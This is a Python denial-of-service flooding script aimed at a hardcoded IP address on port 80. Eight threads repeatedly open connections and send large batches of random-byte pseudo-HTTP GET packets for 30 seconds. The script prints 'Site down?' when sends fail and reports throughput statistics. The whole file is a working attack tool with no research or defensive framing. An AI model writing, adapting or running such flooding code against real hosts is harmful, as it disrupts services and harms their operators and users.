from concurrent.futures import Future, ThreadPoolExecutor
from random import randbytes
from socket import AF_INET, SOCK_STREAM, gethostbyname, socket
from sys import exit
from time import time
from threading import Thread

HOST: str = '3.140.9.152'
PORT: int = 80

PAYLOAD_SIZE: int = 4200

THREADS: int = 8
BATCH_SIZE: int = 100_000

results = [None] * THREADS

try:
    target_ip = gethostbyname(HOST)
except:
    print('[ERROR] Invalid URL')
    exit()


def suplex(payload_size: int, batch_size: int, index: int, length: int = 0):
    infinite: bool = False
    if not length:
        infinite = True
    else:
        time_stop = length + time()
    
    payload = randbytes(PAYLOAD_SIZE)

    packet_count: int = 0
    while time() < time_stop or infinite:
        try:
            target = socket(AF_INET, SOCK_STREAM)
            target.connect((target_ip, PORT))
        except:
            continue
        
        packet: bytes = str.encode('GET ') + payload + str.encode(' HTTP/1.1 \r\n')

        fail_count: int = 0
        for _ in range(batch_size):
            try:
                target.send(packet)
            except:
                fail_count += 1
        
        packet_count += batch_size

        if fail_count == batch_size:
            print('Site down?')
            return True
    
    results[index] = packet_count

threads = []

time_start = time()
for i in range(THREADS):
    thread = Thread(target=suplex, args=(PAYLOAD_SIZE, BATCH_SIZE, i, 30))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

time_end = time()
time_total = time_end - time_start

packet_count = sum(results)

print(f'Total Time: {time_total}s')
print(f'Total Packets: {packet_count}')
print(f'Packets / s: {packet_count / time_total}')
print(f'MB / s: {(packet_count * PAYLOAD_SIZE / 1e6) / time_total}')
